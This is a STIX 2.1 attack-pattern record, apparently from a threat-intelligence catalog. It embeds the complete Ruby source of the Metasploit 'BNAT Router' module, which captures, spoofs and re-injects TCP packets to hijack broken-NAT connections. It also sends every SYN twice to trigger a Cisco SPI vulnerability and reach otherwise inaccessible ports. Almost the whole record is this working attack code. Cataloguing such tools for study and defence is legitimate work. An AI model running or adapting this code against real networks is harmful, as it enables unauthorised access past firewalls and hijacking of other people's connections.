{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c32b4067-7a2d-4b6e-97ff-0b908cfdeda6",
    "created": "2024-08-14T16:32:57.990072Z",
    "modified": "2024-08-14T16:32:57.990076Z",
    "name": "BNAT Router",
    "description": " This module will properly route BNAT traffic and allow for connections to be established to machines on ports which might not otherwise be accessible.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/bnat/bnat_router.rb",
            "external_id": "bnat_router.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/claudijd/bnat"
        },
        {
            "source_name": "reference",
            "url": "http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  def initialize\n    super(\n      'Name'         => 'BNAT Router',\n      'Description'  => %q{\n          This module will properly route BNAT traffic and allow for connections to be\n        established to machines on ports which might not otherwise be accessible.},\n      'Author'       =>\n        [\n            'bannedit',\n            'Jonathan Claudius',\n        ],\n      'License'      => MSF_LICENSE,\n      'References'   =>\n        [\n          [ 'URL', 'https://github.com/claudijd/bnat' ],\n          [ 'URL', 'http://www.slideshare.net/claudijd/dc-skytalk-bnat-hijacking-repairing-broken-communication-channels']\n        ]\n    )\n    register_options(\n        [\n          OptString.new('OUTINF',    [true, 'The external interface connected to the internet', 'eth1']),\n          OptString.new('ININF',     [true, 'The internal interface connected to the network', 'eth2']),\n          OptString.new('CLIENTIP',  [true, 'The ip of the client behing the BNAT router', '192.168.3.2']),\n          OptString.new('SERVERIP',  [true, 'The ip of the server you are targeting', '1.1.2.1']),\n          OptString.new('BNATIP',    [true, 'The ip of the bnat response you are getting', '1.1.2.2']),\n        ])\n  end\n\n  def run\n    clientip = datastore['CLIENTIP']\n    serverip = datastore['SERVERIP']\n    bnatip =   datastore['BNATIP']\n    outint =   datastore['OUTINF']\n    inint =    datastore['ININF']\n\n    clientmac = arp2(clientip,inint)\n    print_line(\"Obtained Client MAC: #{clientmac}\")\n    servermac = arp2(serverip,outint)\n    print_line(\"Obtained Server MAC: #{servermac}\")\n    bnatmac = arp2(bnatip,outint)\n    print_line(\"Obtained BNAT MAC: #{bnatmac}\\n\\n\")\n\n    # Create Interface Specific Configs\n    outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig \":#{outint}\").config\n    inconfig =  PacketFu::Config.new(PacketFu::Utils.ifconfig \":#{inint}\").config\n\n    # Set Captures for Traffic coming from Outside and from Inside respectively\n    outpcap = PacketFu::Capture.new( :iface => \"#{outint}\", :start => true, :filter => \"tcp and src #{bnatip}\" )\n    print_line(\"Now listening on #{outint}...\")\n\n    inpcap = PacketFu::Capture.new( :iface => \"#{inint}\", :start => true, :filter => \"tcp and src #{clientip} and dst #{serverip}\" )\n    print_line(\"Now listening on #{inint}...\\n\\n\")\n\n    # Start Thread from Outside Processing\n    fromout = Thread.new do\n      loop do\n        outpcap.stream.each do |pkt|\n          packet = PacketFu::Packet.parse(pkt)\n\n          # Build a shell packet that will never hit the wire as a hack to get desired mac's\n          shell_pkt = PacketFu::TCPPacket.new(:config => inconfig, :timeout => 0.1, :flavor => \"Windows\")\n          shell_pkt.ip_daddr = clientip\n          shell_pkt.recalc\n\n          # Mangle Received Packet and Drop on the Wire\n          packet.ip_saddr = serverip\n          packet.ip_daddr = clientip\n          packet.eth_saddr = shell_pkt.eth_saddr\n          packet.eth_daddr = clientmac\n          packet.recalc\n          inj = PacketFu::Inject.new( :iface => \"#{inint}\", :config => inconfig )\n          inj.a2w(:array => [packet.to_s])\n          print_status(\"inpacket processed\")\n        end\n      end\n    end\n\n    # Start Thread from Inside Processing\n    fromin = Thread.new do\n      loop do\n        inpcap.stream.each do |pkt|\n          packet = PacketFu::Packet.parse(pkt)\n\n          if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0\n            packet.ip_daddr = serverip\n            packet.eth_daddr = servermac\n          else\n            packet.ip_daddr = bnatip\n            packet.eth_daddr = bnatmac\n          end\n\n          # Build a shell packet that will never hit the wire as a hack to get desired mac's\n          shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>\"Windows\")\n          shell_pkt.ip_daddr = serverip\n          shell_pkt.recalc\n\n          # Mangle Received Packet and Drop on the Wire\n          packet.eth_saddr = shell_pkt.eth_saddr\n          packet.ip_saddr=shell_pkt.ip_saddr\n          packet.recalc\n          inj = PacketFu::Inject.new( :iface => \"#{outint}\", :config =>outconfig )\n          inj.a2w(:array => [packet.to_s])\n\n          # Trigger Cisco SPI Vulnerability by Double-tapping the SYN\n          if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0\n            select(nil, nil, nil, 0.75)\n            inj.a2w(:array => [packet.to_s])\n          end\n          print_status(\"outpacket processed\")\n        end\n      end\n    end\n    fromout.join\n    fromin.join\n  end\n\n  def arp2(target_ip,int)\n    config = PacketFu::Config.new(PacketFu::Utils.ifconfig \":#{int}\").config\n    arp_pkt = PacketFu::ARPPacket.new(:flavor => \"Windows\")\n    arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = config[:eth_saddr]\n    arp_pkt.eth_daddr = \"ff:ff:ff:ff:ff:ff\"\n    arp_pkt.arp_daddr_mac = \"00:00:00:00:00:00\"\n    arp_pkt.arp_saddr_ip = config[:ip_saddr]\n    arp_pkt.arp_daddr_ip = target_ip\n    cap = PacketFu::Capture.new(:iface => config[:iface], :start => true, :filter => \"arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}\")\n    injarp = PacketFu::Inject.new(:iface => config[:iface])\n    injarp.a2w(:array => [arp_pkt.to_s])\n    target_mac = nil\n\n    while target_mac.nil?\n      if cap.save > 0\n        arp_response = PacketFu::Packet.parse(cap.array[0])\n        target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip = target_ip\n      end\n      select(nil, nil, nil, 0.1) # Check for a response ten times per second.\n    end\n    return target_mac\n  end\nend\n"
}